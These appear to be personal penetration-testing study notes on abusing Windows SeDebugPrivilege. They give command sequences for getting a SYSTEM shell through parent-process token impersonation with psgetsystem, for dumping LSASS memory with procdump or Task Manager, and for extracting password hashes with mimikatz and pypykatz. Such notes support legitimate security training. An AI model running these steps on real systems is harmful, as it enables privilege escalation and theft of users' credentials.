### sedebug Privilege

you can leverage this to create a dump for  lsass process memmory with pypykatz/mimikatz to 
extract pass hash
## Impact
- **SeDebugPrivilege → SYSTEM shell → run Mimikatz `sekurlsa` or `lsadump` modules** is the best and most reliable technique.
- 1. **SYSTEM SHELL** + sam dump:  we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal  system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM

- **2. Dump creds that are in memory ( dump lsass process mem)**:
	run: `sekurlsa::logonpasswords`
## Requirements
- sedebug privilege
---
## Exploitation Techniques
### 1. `auto abuse sedebug to  system shell script` (needs compile)
### exploitation steps:
1. **manually**
- run tasklist
- select a process running as system
- create child process (cmd) with token of parent (process thats running as system)
---
## 1.  psgetsystem (semi manual) RCE
blog link: [usage guide for script](https://decoder.cloud/2018/02/02/getting-system/)
tool repo: https://github.com/decoder-it/psgetsystem

First, open an elevated PowerShell console, type creds,
`run tasklist to find a SYSTEM process`
```powershell-session
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

`execute script and target winlogon as the parent process`
```
. .\psgetsys.ps1
ImpersonateFromParentPid -ppid 2056 -command c:\Windows\System32\cmd.exe -cmdargs whoami  
```

![](Pasted%20image%2020250311180331.png)
We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)



```
PS> . .\psgetsys.ps1 

PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```
We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)



3 . **with auto abuse script**:
https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations
- download script 
Other tools such as [this one (.exe to compile)](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. 
## 2. dump lsass mem:
#### Exploitation steps
with GUI Access: Task maanger dump lsass process memmory
- without GUi: `procdump` , then you can either:
- run mimkatz on host to extract cached creds.
-  copy `.dmp` file  to kali, then run pypykatz

`procdump lsass`
```cmd-session
> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

` mimikatz minidump::`
```
#mimikatz
# log <- saves output (good for many creds)
# sekurlsa::minidump lsass.dmp     ! Extracts NTLM hash
sekurlsa::logonpasswords
```
---
#### manual  lsass dump
Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.
![](Pasted%20image%2020250311175151.png)

---
